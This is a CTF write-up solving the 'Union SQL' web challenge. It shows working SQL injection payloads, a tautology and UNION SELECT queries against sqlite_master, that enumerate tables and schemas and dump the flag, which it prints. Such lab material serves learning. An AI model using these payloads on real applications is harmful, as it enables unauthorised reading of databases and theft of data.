# Union SQL
Web

## Challenge 

This time, try to find the table that contains the flag!

http://challs.hats.sg:1351

Challenge by: Gladiator

## Solution

Reference: https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc

As before, we can do injection like this.

> 2' or 1=1;-- 

	--name-- | --description--
	| 
	Dog | Is an animal
	MOOOO | MEW
	Salmon | Is a fish
	flag | NOT THE FLAG

The title tells us that we need to use UNION, so check that it works.

> 2' or 1=1 UNION SELECT 123,456;-- 

	--name-- | --description--
	123 | 456
	Dog | Is an animal
	MOOOO | MEW
	Salmon | Is a fish
	flag | NOT THE FLAG

And we can get a [list of table names from sqlite_master](https://www.sqlitetutorial.net/sqlite-tutorial/sqlite-show-tables/). Use UNION to add it to our result and [concat the names together](https://www.sqlitetutorial.net/sqlite-group_concat/).

> 2' or 1=1 UNION SELECT GROUP_CONCAT(name), NULL FROM sqlite_master;--  

	--name-- | --description--
	Dog | Is an animal
	MOOOO | MEW
	Salmon | Is a fish
	flag | NOT THE FLAG
	user,flag | 

We see a table name called 'flag'. Let's check it out. Find out the [list of columns inside the table](https://stackoverflow.com/questions/685206/how-to-get-a-list-of-column-names).

> 2' or 1=1 UNION SELECT sql, NULL FROM sqlite_master;--

	--name-- | --description--
	CREATE TABLE "flag" ( "flag"	TEXT ) | 
	CREATE TABLE "user" ( "id"	INTEGER, "name"	TEXT, "description"	TEXT, PRIMARY KEY("id") ) | 
	Dog | Is an animal
	MOOOO | MEW
	Salmon | Is a fish
	flag | NOT THE FLAG

There is only one column. Read it out

> 2' or 1=1 UNION SELECT flag, NULL FROM flag;--

	--name-- | --description--
	Dog | Is an animal
	HATS{by_order_of_the_union_you_shall_be_knighted_with_the_rank_of_arch_haxor} | 
	MOOOO | MEW
	Salmon | Is a fish
	flag | NOT THE FLAG


## Flag

	HATS{by_order_of_the_union_you_shall_be_knighted_with_the_rank_of_arch_haxor}
